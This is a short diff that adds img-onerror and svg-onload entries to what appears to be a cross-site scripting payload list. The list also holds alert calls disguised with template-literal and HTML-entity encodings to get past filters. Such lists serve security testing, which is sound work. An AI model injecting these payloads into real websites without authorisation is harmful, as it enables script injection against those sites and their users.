@@ -1,3 +1,5 @@
+<img src="x" onerror="alert(1)" />
+<svg onload=alert('XSS')>
 alert`1`
 alert&lpar;1&rpar;
 alert&#x28;1&#x29
